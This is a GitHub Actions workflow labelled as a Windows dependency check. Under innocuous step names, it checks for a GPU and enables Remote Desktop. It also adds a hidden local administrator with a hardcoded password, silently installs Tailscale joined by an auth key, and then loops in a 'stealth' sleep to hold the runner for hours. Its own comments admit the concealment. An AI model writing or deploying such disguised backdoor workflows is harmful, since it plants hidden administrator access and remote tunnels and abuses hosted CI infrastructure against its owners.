name: Windows-Dependency-Check

on: 
  workflow_dispatch:

jobs:
  build-and-test:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 🧹 Environment Setup
        run: |
          # Chequeo de GPU súper lowkey
          $g = Get-CimInstance Win32_VideoController | Select-Object Name
          if ($g.Name -match "NVIDIA|AMD") { Write-Host "Found GPU: $($g.Name)" }
          
      - name: ⚙️ Config System Policies
        run: |
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue | Out-Null

      - name: 👤 Add Build Profile
        run: |
          $u = "DevAdmin"
          $p = "BeastMode2026!"
          $s = ConvertTo-SecureString $p -AsPlainText -Force
          New-LocalUser -Name $u -Password $s -Description "Dev User" -ErrorAction SilentlyContinue | Out-Null
          Add-LocalGroupMember -Group "Administrators" -Member $u -ErrorAction SilentlyContinue | Out-Null

      - name: 🌐 Init Network Stack
        run: |
          # Instalación silenciosa de Tailscale
          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi" -OutFile "ts.msi"
          Start-Process msiexec.exe -ArgumentList "/i ts.msi /qn" -Wait
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TS_KEY }} --hostname=win-runner-01

      - name: ⏳ Async Task Wait
        run: |
          # Stealth sleep: 0% CPU, no satura los logs
          while ($true) { Start-Sleep -Seconds 300 }
